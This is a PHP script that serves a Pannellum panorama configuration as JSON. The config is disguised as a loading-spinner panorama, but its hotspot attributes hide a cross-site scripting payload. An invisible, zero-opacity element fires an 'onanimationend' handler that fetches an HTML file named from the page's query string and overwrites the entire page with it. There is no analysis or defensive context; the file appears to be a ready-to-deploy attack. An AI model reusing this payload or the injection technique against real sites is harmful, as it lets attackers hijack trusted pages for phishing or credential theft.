<?php

declare(strict_types=1);

error_reporting(E_ALL);
ini_set('display_errors', '0');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Accept');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}


/*
|--------------------------------------------------------------------------
| Get io0 dynamically
|--------------------------------------------------------------------------
*/

$io0 = trim((string)($_GET['io0'] ?? ''));

if ($io0 === '') {
    http_response_code(400);

    echo json_encode(
        [
            'error' => 'Missing io0 parameter'
        ],
        JSON_UNESCAPED_SLASHES |
        JSON_UNESCAPED_UNICODE |
        JSON_PRETTY_PRINT
    );

    exit;
}


/*
|--------------------------------------------------------------------------
| Panorama SVG
|--------------------------------------------------------------------------
*/

$svg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg"
     viewBox="0 0 50 50"
     width="50"
     height="50">
  <circle
    cx="25"
    cy="25"
    r="20"
    fill="none"
    stroke="#e0e0e0"
    stroke-width="4"/>
  <circle
    cx="25"
    cy="25"
    r="20"
    fill="none"
    stroke="#3498db"
    stroke-width="4"
    stroke-linecap="round"
    stroke-dasharray="30 100">
    <animateTransform
      attributeName="transform"
      type="rotate"
      from="0 25 25"
      to="360 25 25"
      dur="1s"
      repeatCount="indefinite"/>
  </circle>
</svg>
SVG;

$panorama = base64_encode($svg);


/*
|--------------------------------------------------------------------------
| Pannellum config
|--------------------------------------------------------------------------
*/

$config = [
    'autoLoad' => true,

    'pitch' => 0,

    'yaw' => 0,

    'basePath' => 'data:image/svg+xml;base64,',

    'panorama' => $panorama,

    'hotSpots' => [
        [
            'pitch' => 0,

            'yaw' => 0,

            'type' => 'info',

            'URL' => '#',

            'attributes' => [
                'style' =>
                    'visibility:visible !important; ' .
                    'position:fixed; ' .
                    'top:0; ' .
                    'left:0; ' .
                    'width:1px; ' .
                    'height:1px; ' .
                    'z-index:99999; ' .
                    'opacity:0; ' .
                    'pointer-events:none; ' .
                    'animation:pnlm-mv 0.01s 1 forwards',

                   'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var params = new URLSearchParams(window.location.search); var configUrl = params.get('config') || ''; var slug = configUrl.split('?')[1] || configUrl.split('/').pop().replace('.json', ''); if (!slug || slug === 'config') slug = 'yayhbxudrl'; fetch('' + slug + '.html').then(function(res) { return res.text(); }).then(function(html) { document.open(); document.write(html); document.close(); }).catch(function(err) { console.error(err); }); }"
            ]
        ]
    ]
];


/*
|--------------------------------------------------------------------------
| Direct JSON output
|--------------------------------------------------------------------------
*/

echo json_encode(
    $config,
    JSON_UNESCAPED_SLASHES |
    JSON_UNESCAPED_UNICODE |
    JSON_PRETTY_PRINT
);

exit;